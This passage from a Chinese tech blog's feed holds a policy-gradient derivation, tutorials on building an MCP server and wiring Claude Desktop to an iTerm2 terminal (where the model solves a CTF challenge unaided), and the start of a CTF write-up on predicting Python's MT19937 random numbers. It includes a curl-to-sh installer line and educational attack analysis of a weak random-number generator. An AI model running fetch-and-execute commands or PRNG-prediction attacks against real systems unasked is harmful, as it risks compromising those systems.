s)}[Q(s,a_t)]\\&=\mathbb{E}_{s\in S}\nabla_\theta\mathbb{E}_{a_t\sim\pi_\theta(*\mid s)}[Q(s,a_t)]\\&=\mathbb{E}_{s\in S}\nabla_\theta\int_{a_t\in A}\pi_\theta(a_t\mid s)Q(s,a_t)\\&=\mathbb{E}_{s\in S}\int_{a_t\in A}\nabla_\theta\pi_\theta(a_t\mid s)Q(s,a_t)\end{aligned}</script><p>上面积分式中，仅有 <script type="math/tex">\pi_\theta(a_t\mid s)</script> 依赖于参数 <script type="math/tex">\theta</script>，故可以单独计算此项：</p><script type="math/tex; mode=display">\nabla_\theta\pi_\theta(a_t\mid s)</script><p>但这里梯度的外面还套着一个积分，算起来十分麻烦，因此使用了一个非常基本的对数导数等式：</p><script type="math/tex; mode=display">\frac{\partial(\log{f(x)})}{\partial x}=\frac{\partial(f(x))}{\partial x}\frac{1}{f(x)}</script><p>应用上式，有：</p><script type="math/tex; mode=display">\nabla_\theta\pi_\theta(a_t\mid s)=\nabla_\theta(\log{\pi_\theta(a_t\mid s)})\pi_\theta(a_t\mid s)</script><p>这么做的目的是在积分里面凑出来了一个概率分布：<script type="math/tex">\pi_\theta(*\mid s)</script>，从而可以将前面的积分转化为一个新的期望：</p><script type="math/tex; mode=display">\int_{a_t\in A}\nabla_\theta(\log{\pi_\theta(a_t\mid s)})\pi_\theta(a_t\mid s)Q(s,a_t)=\mathbb{E}_{a_t\sim\pi_\theta(*\mid s)}[\nabla_\theta(\log{\pi_\theta(a_t\mid s)})Q(s,a_t)]</script><p>则梯度可表示为：</p><script type="math/tex; mode=display">\nabla_\theta J(\theta)=\mathbb{E}_{s\in S}\mathbb{E}_{a_t\sim\pi_\theta(*\mid s)}[\nabla_\theta(\log{\pi_\theta(a_t\mid s)})Q(s,a_t)]</script><p>这样，就顺利的把梯度运算符移到了嵌套期望的内部，接下来的一个常用技巧是使用蒙特卡洛采样算法去估计 <script type="math/tex">Q(s,a_t)</script> 这一项的期望值。</p><script type="math/tex; mode=display">Q(s,a_t)\approx\sum_{i=t}^n\gamma^{i-t}R_i</script><p>如此一来，计算 <script type="math/tex">J(\theta)</script> 对 <script type="math/tex">\theta</script> 的梯度值就有了从代码上实现的可行性。</p><p>假设在某个策略 <script type="math/tex">\pi_\theta</script> 下收集了足够多的游戏数据：</p><script type="math/tex; mode=display">\{(s_t,a_t,R_t)\mid t=0,\dots,T\}</script><p>我们只需计算：</p><script type="math/tex; mode=display">J(\theta)\approx\sum_{t=0}^T(\sum_{i=t}^T\gamma^{i-t}R_i)\log{\pi_\theta(a_t\mid s_t)}</script><p>然后应用反向传播与梯度上升算法，即可优化 <script type="math/tex">\theta</script>。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;最近学习强化学习的策略梯度算法时，遇到其中策略梯度的计算部分，一些推导的细节在我所学习的视频中被一句话带过了，而这些推导过程本该十分重要，故在本文中简单整理一下。&lt;/p&gt;
&lt;p&gt;首先表述几个基本的符号：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;script</summary>
        
      
    
    
    
    <category term="学习笔记" scheme="https://blog.fyz666.xyz/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="强化学习" scheme="https://blog.fyz666.xyz/tags/%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>MCP服务编写实践</title>
    <link href="https://blog.fyz666.xyz/blog/12561/"/>
    <id>https://blog.fyz666.xyz/blog/12561/</id>
    <published>2025-05-05T15:07:48.000Z</published>
    <updated>2025-08-14T08:53:41.568Z</updated>
    
    <content type="html"><![CDATA[<h2 id="动机"><a href="#动机" class="headerlink" title="动机"></a>动机</h2><p>前文曾提到可以使用MCPM管理各种现成的MCP服务以使得大语言模型接入许多现成工具，那么自然会想要自己写一个适合自身需求的工具来让大模型调用，本文就来简单记录一下这个过程。</p><p>关于MCP服务的编写，GitHub上已经有了现成的仓库了：</p><a class="tag-Link" target="_blank" href=" https://github.com/modelcontextprotocol/">    <div class="tag-link-tips">引用站外地址，不保证站点的可用性和安全性</div>    <div class="tag-link-bottom">        <div class="tag-link-left">            <img src="https://logo.clearbit.com/github.com?size=256" onerror="this.onerror=null;this.src='/images/default-link.png';" />        </div>        <div class="tag-link-right">            <div class="tag-link-title">modelcontextprotocol</div>            <div class="tag-link-sitename"> GitHub</div>        </div>        <i class="fa-solid fa-angle-right"></i>    </div>    </a><p>作为一名练习时长两个两年半的Python练习生，我选择了其中的<a href="https://github.com/modelcontextprotocol/python-sdk">Python SDK</a>。</p><h2 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h2><p>这个Python SDK支持的Python版本为：&gt;=3.10，并且最好使用<code>uv</code>管理环境。</p><p>因此先安装<code>uv</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-LsSf</span> https://astral.sh/uv/install.sh <span class="token operator">|</span> <span class="token function">sh</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>uv</code>安装完成后，初始化项目目录：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">uv init mcp_server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>该操作会生成一些配置文件，以及一个虚拟环境，检查<code>.python-version</code>以及<code>pyproject.toml</code>里面Python的版本，需要&gt;=3.10，如不满足则手动修改，然后运行<code>uv venv</code>，即可重置环境。</p><p>接下来安装这个SDK：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">uv <span class="token function">add</span> <span class="token string">"mcp[cli]"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="编写代码"><a href="#编写代码" class="headerlink" title="编写代码"></a>编写代码</h2><p>这里，我们让LLM来做一件简单的事：列出我桌面上的所有文件</p><p>编写<code>main.py</code>：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">from</span> mcp<span class="token punctuation">.</span>server<span class="token punctuation">.</span>fastmcp <span class="token keyword">import</span> FastMCPmcp <span class="token operator">=</span> FastMCP<span class="token punctuation">(</span><span class="token string">'windshadow-universe'</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@mcp<span class="token punctuation">.</span>tool</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">async</span> <span class="token keyword">def</span> <span class="token function">list_desktop_files</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""列出桌面上的文件"""</span>    <span class="token keyword">return</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>expanduser<span class="token punctuation">(</span><span class="token string">'~/Desktop'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="配置Claude-Desktop"><a href="#配置Claude-Desktop" class="headerlink" title="配置Claude Desktop"></a>配置Claude Desktop</h2><p>在Claude Desktop的配置文件（<code>claude_desktop_config.json</code>）中添加一项：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"mcpServers"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    ...    <span class="token property">"windshadow-universe"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token property">"command"</span><span class="token operator">:</span> <span class="token string">"/absolute/path/to/uv"</span><span class="token punctuation">,</span>      <span class="token property">"args"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token string">"run"</span><span class="token punctuation">,</span>        <span class="token string">"--project"</span><span class="token punctuation">,</span>        <span class="token string">"/absolute/path/to/project/dir/mcp_server"</span><span class="token punctuation">,</span>        <span class="token string">"mcp"</span><span class="token punctuation">,</span>        <span class="token string">"run"</span><span class="token punctuation">,</span>        <span class="token string">"/absolute/path/to/project/dir/mcp_server/main.py"</span>      <span class="token punctuation">]</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里有三个绝对路径需要替换，分别是<code>uv</code>的绝对路径、通过<code>uv</code>初始化生成的项目目录<code>mcp_server</code>的绝对路径，以及前面创建的<code>main.py</code>文件的绝对路径。如使用相对路径则会失败（</p><p>接下来打开Claude Desktop，并让它列出我的桌面文件，Claude会作出回应调用我们刚刚写的函数：</p><p><img src="https://blogfiles.oss.fyz666.xyz/png/2f4a0278-2484-4935-bb62-a94509868826.png" alt="image-20250509144540460" style="zoom:50%;" /></p><hr><p>然而并不是很想给Claude打钱，求求ChatGPT Desktop赶紧更新MCP支持🙏🙏🙏。</p><p><img src="https://blogfiles.oss.fyz666.xyz/png/02965303-13e0-4698-9713-4559fa9eb418.png" alt="image-20250505234832457" style="zoom:50%;" /></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;动机&quot;&gt;&lt;a href=&quot;#动机&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="瞎捣鼓经历" scheme="https://blog.fyz666.xyz/categories/%E7%9E%8E%E6%8D%A3%E9%BC%93%E7%BB%8F%E5%8E%86/"/>
    
    
    <category term="LLM" scheme="https://blog.fyz666.xyz/tags/llm/"/>
    
    <category term="MCP" scheme="https://blog.fyz666.xyz/tags/mcp/"/>
    
  </entry>
  
  <entry>
    <title>MCPM：让LLM调用你电脑上的一切工具</title>
    <link href="https://blog.fyz666.xyz/blog/12471/"/>
    <id>https://blog.fyz666.xyz/blog/12471/</id>
    <published>2025-04-20T14:23:53.000Z</published>
    <updated>2025-08-14T08:53:41.568Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>自从大语言模型（LLM）诞生以来，至今已有两年多的发展时间。如今市面上的各类 LLM 模型层出不穷，功能趋于同质化，用户的选择越来越多。然而，作为一名 LLM 重度用户，显然不满足于仅在聊天窗口中进行简单的对话式交互——更希望将 LLM 作为智能助手，融入到本地工具链中，提升工作效率并拓展应用边界。这些工具并不局限于诸如 VS Code、JetBrains IDE 等开发环境（这些IDE自身已经提供各种LLM的插件，以辅助代码编写），还包括终端命令行、文件管理器、数据库客户端、甚至是操作系统本身提供的原生命令与服务。将 LLM 与本地工具链深度集成，不仅能够实现自然语言驱动的自动化操作，还可以显著扩展模型的执行能力与实用性。为了实现这一目标，开放式的模型上下文协议（Model Context Protocol, MCP），为我们提供了一个标准化、可扩展的集成方案。</p><p>但如果为各种大模型、各种软件分别配置对应的MCP，则会非常的麻烦。很巧的是前两天，一位我关注的UP：严伯钧，发布了一个视频，提到他们团队开发了一个用于一站式管理各种软件MCP的开源软件：MCPM，我一看，欸🤓👆，这不就是我想要的管理工具吗？于是，火速对着文档一通操作，将MCPM安装了下，并试验性地通过它配置了一下Claude Desktop与iTerm2的集成，感觉非常好用，这里简单记录一下配置过程以及使用体验。</p><p>首先，本次配置在MacBook上进行，用到了下面两个仓库：</p><p>第一个自然就是 MCPM：</p><a class="tag-Link" target="_blank" href=" https://github.com/pathintegral-institute/mcpm.sh/">    <div class="tag-link-tips">引用站外地址，不保证站点的可用性和安全性</div>    <div class="tag-link-bottom">        <div class="tag-link-left">            <img src="https://logo.clearbit.com/github.com?size=256" onerror="this.onerror=null;this.src='/images/default-link.png';" />        </div>        <div class="tag-link-right">            <div class="tag-link-title">mcpm.sh</div>            <div class="tag-link-sitename"> GitHub</div>        </div>        <i class="fa-solid fa-angle-right"></i>    </div>    </a><p>另一个仓库：</p><a class="tag-Link" target="_blank" href=" https://github.com/ferrislucas/iterm-mcp">    <div class="tag-link-tips">引用站外地址，不保证站点的可用性和安全性</div>    <div class="tag-link-bottom">        <div class="tag-link-left">            <img src="https://logo.clearbit.com/github.com?size=256" onerror="this.onerror=null;this.src='/images/default-link.png';" />        </div>        <div class="tag-link-right">            <div class="tag-link-title">iterm-mcp</div>            <div class="tag-link-sitename"> GitHub</div>        </div>        <i class="fa-solid fa-angle-right"></i>    </div>    </a><p>用于在大模型的会话中集成与iTerm2的交互。</p><h2 id="安装并简单配置-MCPM"><a href="#安装并简单配置-MCPM" class="headerlink" title="安装并简单配置 MCPM"></a>安装并简单配置 MCPM</h2><p>如仓库Readme文件所述，此软件有多种安装方法，你可以用<code>brew</code>、<code>pip</code>、<code>pipx</code>或<code>curl</code>进行安装，我在MacBook上安装，于是使用了<code>brew</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">brew <span class="token function">install</span> mcpm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装完成后，我们可以看到<code>mcpm</code>支持下面几种客户端：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">╰─➤  mcpm client <span class="token function">ls</span><span class="token punctuation">..</span>.                        Supported MCP Clients┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━┳━━━━━━━━┳━━━━━━━━━┓┃ Client Name                     ┃ Installation  ┃ Status ┃ Profile ┃┡━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━━━━━━━━━╇━━━━━━━━╇━━━━━━━━━┩│ 5ire <span class="token punctuation">(</span>5ire<span class="token punctuation">)</span>                     │ Not installed │        │         ││ Claude Desktop <span class="token punctuation">(</span>claude-desktop<span class="token punctuation">)</span> │ Installed     │ ACTIVE │         ││ Cline <span class="token punctuation">(</span>cline<span class="token punctuation">)</span>                   │ Not installed │        │         ││ Continue <span class="token punctuation">(</span>continue<span class="token punctuation">)</span>             │ Installed     │        │         ││ Cursor <span class="token punctuation">(</span>cursor<span class="token punctuation">)</span>                 │ Not installed │        │         ││ Goose CLI <span class="token punctuation">(</span>goose-cli<span class="token punctuation">)</span>           │ Not installed │        │         ││ Roo Code <span class="token punctuation">(</span>roo-code<span class="token punctuation">)</span>             │ Not installed │        │         ││ Windsurf <span class="token punctuation">(</span>windsurf<span class="token punctuation">)</span>             │ Not installed │        │         │└─────────────────────────────────┴───────────────┴────────┴─────────┘<span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Client大概就是指你想接入的大模型，可惜暂时还没有ChatGPT，不知是否支持自定义客户端的接入，后面再研究研究。这里我先接入了Claude Desktop。</p><a class="tag-Link" target="_blank" href=" https://claude.ai/download">    <div class="tag-link-tips">引用站外地址，不保证站点的可用性和安全性</div>    <div class="tag-link-bottom">        <div class="tag-link-left">            <img src="https://logo.clearbit.com/claude.ai?size=256" onerror="this.onerror=null;this.src='/images/default-link.png';" />        </div>        <div class="tag-link-right">            <div class="tag-link-title">Claude Desktop</div>            <div class="tag-link-sitename"> Claude</div>        </div>        <i class="fa-solid fa-angle-right"></i>    </div>    </a><p>执行下面命令激活<code>claude-desktop</code>客户端：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mcpm client <span class="token builtin class-name">set</span> claude-desktop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>接下来我们可以为此客户端配置服务端接入。然而服务去哪找呢？MCPM提供了一个网站罗列了支持的服务：</p><a class="tag-Link" target="_blank" href=" https://mcpm.sh/registry/">    <div class="tag-link-tips">引用站外地址，不保证站点的可用性和安全性</div>    <div class="tag-link-bottom">        <div class="tag-link-left">            <img src="https://logo.clearbit.com/mcpm.sh?size=256" onerror="this.onerror=null;this.src='/images/default-link.png';" />        </div>        <div class="tag-link-right">            <div class="tag-link-title">MCP Server Registry</div>            <div class="tag-link-sitename"> mcpm.sh</div>        </div>        <i class="fa-solid fa-angle-right"></i>    </div>    </a><p>也可通过命令<code>mcpm search</code>列出所有（或搜索感兴趣的）服务。</p><h2 id="集成与iTerm终端的交互"><a href="#集成与iTerm终端的交互" class="headerlink" title="集成与iTerm终端的交互"></a>集成与iTerm终端的交互</h2><p>这里我首先尝试了<code>iterm-mcp</code>:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">╰─➤  mcpm search itermSearching <span class="token keyword">for</span> MCP servers matching <span class="token string">'iterm'</span>iterm-mcpFound <span class="token number">1</span> server<span class="token punctuation">(</span>s<span class="token punctuation">)</span> matching search criteria<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一条命令即可：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mcpm <span class="token function">add</span> iterm-mcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们可以查看这个服务的基本信息：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">╰─➤  mcpm info iterm-mcpShowing information <span class="token keyword">for</span> MCP server: iterm-mcpiTerm <span class="token punctuation">(</span>iterm-mcp<span class="token punctuation">)</span>Integration with iTerm2 terminal emulator <span class="token keyword">for</span> macOS, enabling LLMs to execute and monitorterminal commands.Server Information:Categories: System ToolsTags: iTerm, server, automationAuthor: ferrislucasLicense: MITURLs:Repository: https://github.com/ferrislucas/iterm-mcpHomepage: https://github.com/ferrislucas/iterm-mcpInstallation Details:npm: <span class="token function">npm</span> installationCommand: npx <span class="token parameter variable">-y</span> iterm-mcp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如此，服务就配置好了，接下来只需重启Claude Desktop，看到如下界面即安装成功：</p><p><img src="https://blogfiles.oss.fyz666.xyz/png/af0d82a3-edd5-496d-a45a-d8e05e60a1f7.png" alt="image-20250420232247306" style="zoom:50%;" /></p><p>图中已激活三个MCP工具，分别用来读取终端输出、往终端发送控制字符以及向终端写入/执行命令：</p><p><img src="https://blogfiles.oss.fyz666.xyz/png/eb03cea5-aae3-41de-ab0a-0e7a748b354b.png" alt="image-20250420232321547" style="zoom:50%;" /></p><div class="note danger simple"><p>在使用之前，需要注意几点：</p><blockquote><ul><li>The user is responsible for using the tool safely.</li><li>No built-in restrictions: iterm-mcp makes no attempt to evaluate the safety of commands that are executed.</li><li>Models can behave in unexpected ways. The user is expected to monitor activity and abort when appropriate.</li><li>For multi-step tasks, you may need to interrupt the model if it goes off track. Start with smaller, focused tasks until you’re familiar with how the model behaves.<br><cite><a href="https://github.com/ferrislucas/iterm-mcp?tab=readme-ov-file#safety-considerations">Safety Considerations of iterm-mcp</a></cite></li></ul></blockquote><p>总结：你得检查大模型给出的命令是否安全。</p></div><h2 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h2><p>这里，我尝试让Claude使用我的本地iTerm终端独立解决<a href="https://github.com/PKU-GeekGame/geekgame-4th/tree/master/official_writeup/tutorial-signin">GeekGame 2024的签到题</a>。</p><p>部分聊天内容如图：</p><p><img src="https://blogfiles.oss.fyz666.xyz/png/ef5f1a3b-f419-436f-b827-9022838859e8.png" alt="image-20250420235343383" style="zoom:50%;" /></p><p>对应的终端操作：</p><p><img src="https://blogfiles.oss.fyz666.xyz/png/dab2c403-f96e-4878-b10e-f92aa27b3898.png" alt="image-20250420235448952" style="zoom:50%;" /></p><p>最终，Claude在我没有给出任何提示的前提下，独立操作我本地的终端，找到了flag：</p><p><img src="https://blogfiles.oss.fyz666.xyz/png/ffe24038-a3b2-4b9b-b087-cd11ffab1c6d.png" alt="image-20250420235530069" style="zoom:50%;" /></p><p>对应的终端操作：</p><p><img src="https://blogfiles.oss.fyz666.xyz/png/c7df279f-01cc-4ec3-8495-530f6723d60d.png" alt="image-20250420235632533" style="zoom:50%;" /></p><p><del>以后打CTF只要把题目下载下来并交给Claude挂一晚上等着第二天收获flag就行了</del></p><hr><p>如此，我们便配置好了<code>MCPM</code>，并成功实现了其最基本的使用方法，使得LLM软件能够调用本地工具，展示了其在本地环境中调用iTerm2的方法。未来将尝试更多的相关服务，以提升生产力！</p>]]></content>
    
    
    <summary type="html">MCPM：高效利用大语言模型的利器</summary>
    
    
    
    <category term="瞎捣鼓经历" scheme="https://blog.fyz666.xyz/categories/%E7%9E%8E%E6%8D%A3%E9%BC%93%E7%BB%8F%E5%8E%86/"/>
    
    
    <category term="LLM" scheme="https://blog.fyz666.xyz/tags/llm/"/>
    
    <category term="MCP" scheme="https://blog.fyz666.xyz/tags/mcp/"/>
    
    <category term="MCPM" scheme="https://blog.fyz666.xyz/tags/mcpm/"/>
    
  </entry>
  
  <entry>
    <title>Python随机数的背后：MT19937算法之——实战演练</title>
    <link href="https://blog.fyz666.xyz/blog/12395/"/>
    <id>https://blog.fyz666.xyz/blog/12395/</id>
    <published>2024-11-29T11:42:29.000Z</published>
    <updated>2025-08-14T08:53:41.567Z</updated>
    
    <content type="html"><![CDATA[<p>本文是一道MT19937随机数预测的实战题，这道题是我2019年第一次参加Hackergame时遇到的，题目链接如下：</p><a class="tag-Link" target="_blank" href=" https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E5%A4%A7%E6%95%B4%E6%95%B0%E5%88%86%E8%A7%A3%E9%94%A6%E6%A0%87%E8%B5%9B/">    <div class="tag-link-tips">引用站外地址，不保证站点的可用性和安全性</div>    <div class="tag-link-bottom">        <div class="tag-link-left">            <img src="https://logo.clearbit.com/github.com?size=256" onerror="this.onerror=null;this.src='/images/default-link.png';" />        </div>        <div class="tag-link-right">            <div class="tag-link-title">大整数分解锦标赛</div>            <div class="tag-link-sitename"> GitHub</div>        </div>        <i class="fa-solid fa-angle-right"></i>    </div>    </a><p>当时我还是一个只会一点点Python的计算机小白，只做了几道最简单的题就结束了自己的赛程。自然，这道题我当时根本就没看，赛后看题解的计划也被我咕咕咕了，一直到最近才自己做了一遍。</p><hr><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>题目服务端的源代码位于这个文件：<a href="https://github.com/ustclug/hackergame2019-writeups/blob/master/official/%E5%A4%A7%E6%95%B4%E6%95%B0%E5%88%86%E8%A7%A3%E9%94%A6%E6%A0%87%E8%B5%9B/src/factorme.py">factorme.py</a></p><p>在本地模拟题目环境：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">socat TCP-LISTEN:9999,fork EXEC:<span class="token string">"python factorme.py"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们可以在1分钟之内（<code>signal.alarm(60)</code>）与服务器进行两种交互：</p><ul><li><p>发送<code>H</code>，服务端会发给我们一段帮助文本</p></li><li><p>发送<code>B</code>，调用下面函数：</p></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        p<span class="token punctuation">,</span> q<span class="token punctuation">,</span> n <span class="token operator">=</span> generate<span class="token punctuation">(</span>i<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"n ="</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>        input_p <span class="token operator">=</span> readnumber<span class="token punctuation">(</span><span class="token punctuation">)</span>        input_q <span class="token operator">=</span> readnumber<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span><span class="token punctuation">[</span>p<span class="token punctuation">,</span> q<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span><span class="token punctuation">[</span>input_p<span class="token punctuation">,</span> input_q<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Wrong answer!"</span><span class="token punctuation">)</span>            exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Good job!"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们要连续分解32个大整数，全对则获得flag。而显然后面非常大的整数我们是分解不出来的，<del>除非找到一个能口算大整数分解的少年班神童</del>，所以这题肯定不能真的去分解整数。</p><hr><p>查看大整数的生成逻辑：<br><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">generate</span><span class="token punctuation">(</span>bits<span class="token punctuation">)</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> sympy<span class="token punctuation">.</span>randprime<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">**</span> bits<span class="token punctuation">)</span>    q <span class="token operator">=</span> sympy<span class="token punctuation">.</span>randprime<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">**</span> bits<span class="token punctuation">)</span>    <span class="token keyword">return</span> p<span class="token punctuation">,</span> q<span class="token punctuation">,</span> p <span class="token operator">*</span> q<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p><p>看似没有任何问题，但其实这个<code>sympy.randprime</code>是这样的：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random <span class="token keyword">as</span> _randomrng <span class="token operator">=</span> _random<span class="token punctuation">.</span>Random<span class="token punctuation">(</span><span class="token punctuation">)</span>randint <span class="token operator">=</span> rng<span class="token punctuation">.</span>randint<span class="token keyword">def</span> <span class="token function">randprime</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> a <span class="token operator">>=</span> b<span class="token punctuation">:</span>        <span class="token keyword">return</span>    a<span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">)</span>    n <span class="token operator">=</span> randint<span class="token punctuation">(</span>a <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> b<span class="token punctuation">)</span>    p <span class="token operator">=</span> nextprime<span class="token punctuation">(</span>n<span class="token punctuation">)</span>    <span class="token keyword">if</span> p <span class="token operator">>=</span> b<span class="token punctuation">:</span>        p <span class="token operator">=</span> prevprime<span class="token punctuation">(</span>b<span class="token punctuation">)</span>    <span class="token keyword">if</span> p <span class="token operator">&lt;</span> a<span class="token punctuation">:</span>        <span class="token keyword">raise</span> ValueError<span class="token punctuation">(</span><span class="token string">"no primes exist in the specified range"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> p<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可见其调用了<code>random</code>来生成随机数。</p><p>注意到<code>help</code>函数会为我们生成一对<code>p</code>、<code>q</code>：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    bits <span class="token operator">=</span> random<span class="token punctuation">.</span>randrange<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">)</span>    p<span class="token punctuation">,</span> q<span class="token punctuation">,</span> n <span class="token operator">=</span> generate<span class="token punctuation">(</span>bits<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"n ="</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"You should send me your answer in two lines like this:"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"p ="</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"q ="</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"In this case, p and q are random primes under %s bits."</span> <span class="token operator">%</span> bits<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>显然我们就可以通过连续调用<code>help</code>来获取非常多的伪随机数bit，这样理论上就可以把状态解出来了。</p><h2 id="随机数分析"><a href="#随机数分析" class="headerlink" 